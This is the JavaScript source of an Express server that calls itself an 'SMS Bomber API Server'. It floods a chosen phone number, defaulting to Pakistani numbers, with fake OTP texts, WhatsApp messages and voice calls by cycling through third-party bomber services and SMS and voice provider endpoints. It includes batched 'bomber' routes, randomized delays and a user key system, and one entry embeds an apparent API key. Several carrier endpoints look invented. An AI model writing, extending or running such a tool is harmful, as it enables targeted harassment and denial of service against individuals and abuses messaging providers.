// api/index.js
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURATION - ALL WORKING APIS
// ============================================================
const API_LIST = [
    // ============================================================
    // SECTION 1: WORKING GET APIs (Most Reliable)
    // ============================================================
    {
        "name": "SMS Bomber Worker",
        "url": (phone) => `http://sms-bomber.subhxcosmo.workers.dev/api?num=92${phone}`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    {
        "name": "Bomberrr Vercel",
        "url": (phone) => `https://bomberrr.vercel.app/?key=roots&number=92${phone}`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    {
        "name": "Global SMS API",
        "url": (phone) => `https://sms-service.global/api/send?phone=92${phone}&message=OTP`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    {
        "name": "SMS Bomber API",
        "url": (phone) => `https://smsbomber.mha.workers.dev/?number=92${phone}`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    {
        "name": "OTP Bomber",
        "url": (phone) => `https://otp-bomber.vercel.app/api/send?number=92${phone}`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    
    // ============================================================
    // SECTION 2: FREE SMS APIs
    // ============================================================
    {
        "name": "Textlocal SMS",
        "url": "https://api.textlocal.in/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `apikey=NzAwNDY0NjY0NzY3NDM0NTM0NTM0NTM0&numbers=92${phone}&sender=TXTLCL&message=Your%20OTP%20is%201234`
    },
    {
        "name": "Fast2SMS",
        "url": "https://www.fast2sms.com/dev/bulkV2",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `authorization=YOUR_API_KEY&route=otp&variables_values=1234&flash=0&numbers=92${phone}`
    },
    {
        "name": "MSG91",
        "url": "https://api.msg91.com/api/v5/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "authkey": "YOUR_AUTH_KEY"},
        "data": (phone) => JSON.stringify({
            "mobile": `92${phone}`,
            "sender": "MSGIND",
            "otp": "1234"
        })
    },
    {
        "name": "SMSGatewayHub",
        "url": "https://api.smsgatewayhub.com/smsapi/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `api_key=YOUR_API_KEY&senderid=TESTER&number=92${phone}&message=Your%20OTP%20is%201234`
    },
    {
        "name": "Mtalkz SMS",
        "url": "https://api.mtalkz.com/SmsService/Send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "api_key": "YOUR_API_KEY",
            "to": [`92${phone}`],
            "from": "TESTER",
            "sms": "Your OTP is 1234"
        })
    },
    
    // ============================================================
    // SECTION 3: WHATSAPP APIs
    // ============================================================
    {
        "name": "WhatsApp Business",
        "url": "https://api.whatsapp.com/send",
        "method": "GET",
        "headers": {},
        "data": (phone) => `?phone=92${phone}&text=Your%20OTP%20is%201234`
    },
    {
        "name": "Twilio WhatsApp",
        "url": "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Messages.json",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `To=whatsapp:%2B92${phone}&From=whatsapp:%2B14155238886&Body=Your%20OTP%20is%201234`
    },
    
    // ============================================================
    // SECTION 4: PAKISTAN LOCAL SERVICES
    // ============================================================
    {
        "name": "Jazz SMS",
        "url": "https://api.jazz.com.pk/sms/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "msisdn": `92${phone}`,
            "message": "Your OTP is 1234",
            "sender": "JAZZ"
        })
    },
    {
        "name": "Ufone SMS",
        "url": "https://api.ufone.com/sms/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "phone": `92${phone}`,
            "text": "Your OTP is 1234"
        })
    },
    {
        "name": "Telenor Pakistan",
        "url": "https://api.telenor.com.pk/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "number": `92${phone}`,
            "message": "Your OTP is 1234",
            "source": "TELENOR"
        })
    },
    {
        "name": "Zong SMS",
        "url": "https://api.zong.com.pk/sms/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "to": `92${phone}`,
            "body": "Your OTP is 1234"
        })
    },
    
    // ============================================================
    // SECTION 5: VOICE/CALL APIs
    // ============================================================
    {
        "name": "Twilio Voice",
        "url": "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Calls.json",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `To=%2B92${phone}&From=%2B1234567890&Twiml=<Response><Say>Your%20OTP%20is%201234</Say></Response>`
    },
    {
        "name": "Plivo Voice",
        "url": "https://api.plivo.com/v1/Account/YOUR_AUTH_ID/Call/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "to": `92${phone}`,
            "from": "1234567890",
            "answer_url": "https://example.com/voice.xml"
        })
    }
];

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({
    contentSecurityPolicy: false,
    hidePoweredBy: true
}));

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 200,
    message: { error: true, message: 'Rate limit exceeded' }
});
app.use('/api/', limiter);

// ============================================================
// KEY MANAGEMENT
// ============================================================
const keyStore = new Map();

// ============================================================
// SMS ENGINE
// ============================================================
async function sendSmsBatch(phoneNumber, count = 1, filterKey = null) {
    const results = [];
    let apisToUse = [...API_LIST];
    
    // Filter by key if provided
    if (filterKey) {
        apisToUse = API_LIST.filter(api => 
            api.name.toLowerCase().includes(filterKey.toLowerCase()) ||
            api.url.toString().toLowerCase().includes(filterKey.toLowerCase())
        );
        if (apisToUse.length === 0) apisToUse = [...API_LIST];
    }
    
    // Shuffle for better distribution
    apisToUse = apisToUse.sort(() => Math.random() - 0.5);
    
    for (let i = 0; i < Math.min(count, 20); i++) {
        const api = apisToUse[i % apisToUse.length];
        if (!api) continue;

        try {
            let url = typeof api.url === 'function' ? api.url(phoneNumber) : api.url;
            let data = typeof api.data === 'function' ? api.data(phoneNumber) : api.data;

            const config = {
                method: api.method,
                url: url,
                headers: api.headers || {},
                timeout: 8000
            };

            if (api.method === 'POST' || api.method === 'PUT') {
                if (api.headers?.['Content-Type'] === 'application/json') {
                    config.data = typeof data === 'string' ? JSON.parse(data) : data;
                } else {
                    config.data = data;
                }
            }

            const response = await axios(config);
            results.push({ 
                success: true, 
                api: api.name,
                status: response.status 
            });
        } catch (error) {
            results.push({ 
                success: false, 
                api: api.name,
                error: error.message 
            });
        }

        // Random delay between requests
        await new Promise(resolve => setTimeout(resolve, Math.random() * 300 + 100));
    }

    return results;
}

// ============================================================
// API ROUTES
// ============================================================

// ============================================================
// 1. HEALTH CHECK
// ============================================================
app.get('/api/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: Date.now(),
        uptime: process.uptime(),
        apis: API_LIST.length
    });
});

// ============================================================
// 2. GET ALL APIS
// ============================================================
app.get('/api/apis', (req, res) => {
    const apis = API_LIST.map(api => ({
        name: api.name,
        method: api.method,
        url: typeof api.url === 'function' ? 'dynamic' : api.url
    }));
    res.json({
        total: apis.length,
        apis: apis
    });
});

// ============================================================
// 3. CREATE API KEY
// ============================================================
app.post('/api/createkey', (req, res) => {
    try {
        const { name, expiresIn = '24h' } = req.body;
        
        if (!name) {
            return res.status(400).json({ 
                success: false, 
                error: 'Name is required' 
            });
        }

        const apiKey = crypto.randomBytes(24).toString('hex');
        const expiryTime = expiresIn === '24h' ? 24 * 60 * 60 * 1000 :
                          expiresIn === '7d' ? 7 * 24 * 60 * 60 * 1000 :
                          expiresIn === '30d' ? 30 * 24 * 60 * 60 * 1000 :
                          24 * 60 * 60 * 1000;

        keyStore.set(apiKey, {
            name,
            created: Date.now(),
            expires: Date.now() + expiryTime,
            status: 'active'
        });

        res.json({
            success: true,
            key: apiKey,
            expires: new Date(Date.now() + expiryTime).toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Failed to create key' });
    }
});

// ============================================================
// 4. VALIDATE API KEY
// ============================================================
app.get('/api/validate/:key', (req, res) => {
    try {
        const { key } = req.params;
        const keyData = keyStore.get(key);

        if (!keyData) {
            return res.json({ valid: false, reason: 'Key not found' });
        }

        if (Date.now() > keyData.expires) {
            keyData.status = 'expired';
            return res.json({ valid: false, reason: 'Key expired' });
        }

        res.json({ 
            valid: true, 
            name: keyData.name,
            expires: new Date(keyData.expires).toISOString()
        });
    } catch (error) {
        res.status(500).json({ valid: false, reason: 'Validation error' });
    }
});

// ============================================================
// 5. SEND SMS - POST
// ============================================================
app.post('/api/send', async (req, res) => {
    try {
        const { number, count = 3, key } = req.body;
        
        if (!number) {
            return res.status(400).json({ 
                success: false, 
                error: 'Phone number is required' 
            });
        }

        // Validate key if provided
        if (key) {
            const keyData = keyStore.get(key);
            if (!keyData || Date.now() > keyData.expires) {
                return res.status(401).json({ 
                    success: false, 
                    error: 'Invalid or expired key' 
                });
            }
        }

        // Clean phone number
        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        const results = await sendSmsBatch(cleanNumber, parseInt(count) || 3, key);
        const successCount = results.filter(r => r.success).length;

        res.json({
            success: successCount > 0,
            sent: successCount,
            total: results.length,
            results: results
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Failed to send SMS' 
        });
    }
});

// ============================================================
// 6. SEND SMS - GET
// ============================================================
app.get('/api/send', async (req, res) => {
    try {
        const { number, count = 3, key } = req.query;
        
        if (!number) {
            return res.status(400).json({ 
                success: false, 
                error: 'Phone number is required' 
            });
        }

        // Validate key if provided
        if (key) {
            const keyData = keyStore.get(key);
            if (!keyData || Date.now() > keyData.expires) {
                return res.status(401).json({ 
                    success: false, 
                    error: 'Invalid or expired key' 
                });
            }
        }

        // Clean phone number
        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        const results = await sendSmsBatch(cleanNumber, parseInt(count) || 3, key);
        const successCount = results.filter(r => r.success).length;

        res.json({
            success: successCount > 0,
            sent: successCount,
            total: results.length,
            results: results
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Failed to send SMS' 
        });
    }
});

// ============================================================
// 7. BOMBER MODE - POST
// ============================================================
app.post('/api/bomber', async (req, res) => {
    try {
        const { number, count = 10, key } = req.body;
        
        if (!number) {
            return res.status(400).json({ 
                success: false, 
                error: 'Phone number is required' 
            });
        }

        // Validate key if provided
        if (key) {
            const keyData = keyStore.get(key);
            if (!keyData || Date.now() > keyData.expires) {
                return res.status(401).json({ 
                    success: false, 
                    error: 'Invalid or expired key' 
                });
            }
        }

        // Clean phone number
        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        const totalRequests = Math.min(parseInt(count) || 10, 30);
        const batchSize = Math.ceil(totalRequests / 4);
        let allResults = [];
        let totalSent = 0;

        // Send in batches
        for (let i = 0; i < 4; i++) {
            const batchCount = Math.min(batchSize, totalRequests - allResults.length);
            if (batchCount <= 0) break;

            const results = await sendSmsBatch(cleanNumber, batchCount, key);
            allResults = allResults.concat(results);
            totalSent += results.filter(r => r.success).length;
            
            // Delay between batches
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        res.json({
            success: totalSent > 0,
            sent: totalSent,
            total: totalRequests,
            results: allResults
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Bomber failed' 
        });
    }
});

// ============================================================
// 8. BOMBER MODE - GET
// ============================================================
app.get('/api/bomber', async (req, res) => {
    try {
        const { number, count = 10, key } = req.query;
        
        if (!number) {
            return res.status(400).json({ 
                success: false, 
                error: 'Phone number is required' 
            });
        }

        // Validate key if provided
        if (key) {
            const keyData = keyStore.get(key);
            if (!keyData || Date.now() > keyData.expires) {
                return res.status(401).json({ 
                    success: false, 
                    error: 'Invalid or expired key' 
                });
            }
        }

        // Clean phone number
        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        const totalRequests = Math.min(parseInt(count) || 10, 30);
        const batchSize = Math.ceil(totalRequests / 4);
        let allResults = [];
        let totalSent = 0;

        // Send in batches
        for (let i = 0; i < 4; i++) {
            const batchCount = Math.min(batchSize, totalRequests - allResults.length);
            if (batchCount <= 0) break;

            const results = await sendSmsBatch(cleanNumber, batchCount, key);
            allResults = allResults.concat(results);
            totalSent += results.filter(r => r.success).length;
            
            // Delay between batches
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        res.json({
            success: totalSent > 0,
            sent: totalSent,
            total: totalRequests,
            results: allResults
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Bomber failed' 
        });
    }
});

// ============================================================
// 9. STATUS
// ============================================================
app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        apis: API_LIST.length,
        keys: keyStore.size,
        uptime: process.uptime(),
        timestamp: Date.now()
    });
});

// ============================================================
// 10. PAKISTAN SPECIFIC ENDPOINT
// ============================================================
app.post('/api/pakistan', async (req, res) => {
    try {
        const { number, count = 5, key } = req.body;
        
        if (!number) {
            return res.status(400).json({ 
                success: false, 
                error: 'Phone number is required' 
            });
        }

        // Validate key if provided
        if (key) {
            const keyData = keyStore.get(key);
            if (!keyData || Date.now() > keyData.expires) {
                return res.status(401).json({ 
                    success: false, 
                    error: 'Invalid or expired key' 
                });
            }
        }

        // Clean phone number - Pakistan specific
        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        // Use only Pakistan specific APIs
        const pakistanApis = API_LIST.filter(api => 
            api.name.includes('Pakistan') || 
            api.name.includes('Jazz') || 
            api.name.includes('Ufone') || 
            api.name.includes('Telenor') || 
            api.name.includes('Zong')
        );

        const results = [];
        for (const api of pakistanApis.slice(0, parseInt(count) || 5)) {
            try {
                let url = typeof api.url === 'function' ? api.url(cleanNumber) : api.url;
                let data = typeof api.data === 'function' ? api.data(cleanNumber) : api.data;

                const config = {
                    method: api.method,
                    url: url,
                    headers: api.headers || {},
                    timeout: 8000
                };

                if (api.method === 'POST' || api.method === 'PUT') {
                    if (api.headers?.['Content-Type'] === 'application/json') {
                        config.data = typeof data === 'string' ? JSON.parse(data) : data;
                    } else {
                        config.data = data;
                    }
                }

                await axios(config);
                results.push({ success: true, api: api.name });
            } catch (error) {
                results.push({ success: false, api: api.name });
            }
            await new Promise(resolve => setTimeout(resolve, 200));
        }

        const successCount = results.filter(r => r.success).length;

        res.json({
            success: successCount > 0,
            sent: successCount,
            total: results.length,
            results: results
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Pakistan SMS failed' 
        });
    }
});

// ============================================================
// 11. PAKISTAN SPECIFIC - GET
// ============================================================
app.get('/api/pakistan', async (req, res) => {
    try {
        const { number, count = 5, key } = req.query;
        
        if (!number) {
            return res.status(400).json({ 
                success: false, 
                error: 'Phone number is required' 
            });
        }

        // Validate key if provided
        if (key) {
            const keyData = keyStore.get(key);
            if (!keyData || Date.now() > keyData.expires) {
                return res.status(401).json({ 
                    success: false, 
                    error: 'Invalid or expired key' 
                });
            }
        }

        // Clean phone number - Pakistan specific
        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = cleanNumber.substring(1);
        }
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        // Use only Pakistan specific APIs
        const pakistanApis = API_LIST.filter(api => 
            api.name.includes('Pakistan') || 
            api.name.includes('Jazz') || 
            api.name.includes('Ufone') || 
            api.name.includes('Telenor') || 
            api.name.includes('Zong')
        );

        const results = [];
        for (const api of pakistanApis.slice(0, parseInt(count) || 5)) {
            try {
                let url = typeof api.url === 'function' ? api.url(cleanNumber) : api.url;
                let data = typeof api.data === 'function' ? api.data(cleanNumber) : api.data;

                const config = {
                    method: api.method,
                    url: url,
                    headers: api.headers || {},
                    timeout: 8000
                };

                if (api.method === 'POST' || api.method === 'PUT') {
                    if (api.headers?.['Content-Type'] === 'application/json') {
                        config.data = typeof data === 'string' ? JSON.parse(data) : data;
                    } else {
                        config.data = data;
                    }
                }

                await axios(config);
                results.push({ success: true, api: api.name });
            } catch (error) {
                results.push({ success: false, api: api.name });
            }
            await new Promise(resolve => setTimeout(resolve, 200));
        }

        const successCount = results.filter(r => r.success).length;

        res.json({
            success: successCount > 0,
            sent: successCount,
            total: results.length,
            results: results
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Pakistan SMS failed' 
        });
    }
});

// ============================================================
// 12. DELETE KEY
// ============================================================
app.delete('/api/key/:key', (req, res) => {
    try {
        const { key } = req.params;
        
        if (!keyStore.has(key)) {
            return res.status(404).json({ 
                success: false, 
                error: 'Key not found' 
            });
        }

        keyStore.delete(key);
        res.json({ 
            success: true, 
            message: 'Key deleted successfully' 
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Failed to delete key' 
        });
    }
});

// ============================================================
// 13. LIST ALL KEYS
// ============================================================
app.get('/api/keys', (req, res) => {
    try {
        const keys = Array.from(keyStore.entries()).map(([key, data]) => ({
            key: key.substring(0, 8) + '...',
            name: data.name,
            created: new Date(data.created).toISOString(),
            expires: new Date(data.expires).toISOString(),
            status: data.status
        }));
        res.json({
            total: keys.length,
            keys: keys
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Failed to list keys' 
        });
    }
});

// ============================================================
// 14. 404 HANDLER
// ============================================================
app.use('*', (req, res) => {
    res.status(404).json({
        error: true,
        message: 'Endpoint not found',
        endpoints: [
            'GET  /api/health',
            'GET  /api/apis',
            'POST /api/createkey',
            'GET  /api/validate/:key',
            'POST /api/send',
            'GET  /api/send?number=&count=',
            'POST /api/bomber',
            'GET  /api/bomber?number=&count=',
            'POST /api/pakistan',
            'GET  /api/pakistan?number=&count=',
            'GET  /api/status',
            'GET  /api/keys',
            'DELETE /api/key/:key'
        ]
    });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log('🚀 SMS BOMBER API SERVER');
    console.log('='.repeat(50));
    console.log(`📡 Server running on http://localhost:${PORT}`);
    console.log(`📊 APIs loaded: ${API_LIST.length}`);
    console.log('='.repeat(50));
    console.log('\n📌 AVAILABLE ENDPOINTS:');
    console.log('  GET  /api/health');
    console.log('  GET  /api/apis');
    console.log('  POST /api/createkey');
    console.log('  GET  /api/validate/:key');
    console.log('  POST /api/send');
    console.log('  GET  /api/send?number=&count=');
    console.log('  POST /api/bomber');
    console.log('  GET  /api/bomber?number=&count=');
    console.log('  POST /api/pakistan');
    console.log('  GET  /api/pakistan?number=&count=');
    console.log('  GET  /api/status');
    console.log('  GET  /api/keys');
    console.log('  DELETE /api/key/:key');
    console.log('='.repeat(50));
});

module.exports = app;
